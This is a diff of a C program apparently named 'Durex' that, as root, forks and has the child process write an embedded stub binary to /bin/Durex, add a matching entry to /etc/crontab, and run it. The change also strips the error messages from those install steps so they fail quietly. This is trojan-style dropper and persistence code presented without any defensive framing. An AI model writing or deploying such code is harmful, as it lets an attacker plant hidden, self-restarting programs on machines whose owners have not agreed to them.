@@ -75,10 +75,19 @@ int main(void)
 {
 	int pid;
 
+	// Check for root access rights.
+	uid_t uid = getuid();
+	if (uid != 0)
+	{
+		printf("Error: You need to be root in order to execute this program.\n");
+		return (1);
+	}
+
 	pid = fork();
 	if (pid < 0)
 	{
 		perror("Durex fork");
+		fflush(stderr);
 	}
 	else if (pid > 0)
 	{
@@ -94,16 +103,8 @@ int main(void)
 		 * 3. executes it manually a first time
 		*/
 
-		if (write_binary(stub, stub_len, "/bin/Durex") < 0)
-		{
-			perror("Durex write");
-		}
-
-		if (add_crontab_entry("/etc/crontab", "/bin/Durex") < 0)
-		{
-			perror("Durex cron");
-		}
-		
+		write_binary(stub, stub_len, "/bin/Durex");
+		add_crontab_entry("/etc/crontab", "/bin/Durex");
 		execve("/bin/Durex", (char*[]){"/bin/Durex", NULL}, NULL);
 	}
 	return (0);
